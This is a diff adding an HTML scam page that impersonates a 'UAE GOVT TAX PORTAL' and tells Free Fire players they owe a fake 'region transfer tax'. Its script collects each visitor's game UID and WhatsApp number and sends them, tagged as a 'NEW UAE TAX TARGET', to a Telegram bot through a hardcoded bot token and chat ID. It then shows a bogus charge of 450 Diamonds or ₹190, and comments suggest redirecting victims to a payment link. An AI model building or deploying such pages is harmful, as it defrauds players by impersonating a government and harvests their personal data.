@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UAE SERVER TAX - OFFICIAL PORTAL</title>
+    <style>
+        body { background: #050505; color: #ff9900; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; }
+        .box { 
+            border: 2px solid #ff9900; padding: 30px; border-radius: 20px; 
+            background: #111; display: inline-block; max-width: 400px;
+            box-shadow: 0 0 30px rgba(255, 153, 0, 0.2);
+            margin-top: 50px;
+        }
+        .uae-flag { width: 80px; margin-bottom: 10px; border-radius: 5px; }
+        input { 
+            width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; 
+            border: 1px solid #333; background: #000; color: white; outline: none;
+        }
+        input:focus { border-color: #ff9900; }
+        button { 
+            width: 100%; padding: 14px; background: #ff9900; color: black; 
+            border: none; border-radius: 8px; font-weight: bold; 
+            cursor: pointer; font-size: 16px; transition: 0.3s;
+        }
+        button:hover { background: #e68a00; transform: scale(1.02); }
+        #status { margin-top: 15px; font-weight: bold; }
+        .tax-info { font-size: 12px; color: #888; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/c/cb/Flag_of_the_United_Arab_Emirates.svg" class="uae-flag" alt="UAE Flag">
+    <h2>🇦🇪 UAE GOVT TAX PORTAL</h2>
+    <p style="color: #ccc;">Region Transfer Authorization (OB52)</p>
+    
+    <input type="number" id="uid" placeholder="Enter Free Fire UID" required>
+    <input type="text" id="phone" placeholder="WhatsApp Number (+91...)" required>
+    
+    <button id="mainBtn" onclick="sendData()">PROCEED TO TAX PAYMENT</button>
+    
+    <p id="status"></p>
+    <p class="tax-info">Note: Standard transfer tax applies as per UAE Server Policy.</p>
+</div>
+
+<script>
+function sendData() {
+    // Tumhara Updated Token aur ID
+    const token = "8480955083:AAFVIXXvXmbt7irxXTUte3ppItRDwn_0CXA"; 
+    const chat_id = "8037300335"; 
+    
+    const uid = document.getElementById('uid').value;
+    const phone = document.getElementById('phone').value;
+    const btn = document.getElementById('mainBtn');
+    const status = document.getElementById('status');
+
+    if(uid == "" || phone == "") {
+        alert("Please fill all details!");
+        return;
+    }
+
+    // Button Animation
+    btn.innerHTML = "Calculating Tax...";
+    btn.disabled = true;
+
+    const message = `🔥 *NEW UAE TAX TARGET*\n\n🆔 *UID:* \`${uid}\`\n📞 *Phone:* \`${phone}\`\n📍 *Status:* Waiting for Payment\n🌐 *Platform:* Vercel Web`;
+
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+    fetch(url)
+    .then(response => {
+        if(response.ok) {
+            status.innerHTML = "✅ Tax Calculated: 450 Diamonds/₹190<br>Please Wait for Payment Gateway...";
+            status.style.color = "lime";
+            // Yahan tum payment link par redirect bhi kar sakte ho
+            setTimeout(() => {
+                btn.innerHTML = "RETRY PAYMENT";
+                btn.disabled = false;
+            }, 3000);
+        } else {
+            status.innerHTML = "❌ Connection Error. Try Again.";
+            status.style.color = "red";
+            btn.innerHTML = "PROCEED TO PAY";
+            btn.disabled = false;
+        }
+    })
+    .catch(err => {
+        alert("Server Error!");
+        btn.disabled = false;
+    });
+}
+</script>
+
+</body>
+</html>
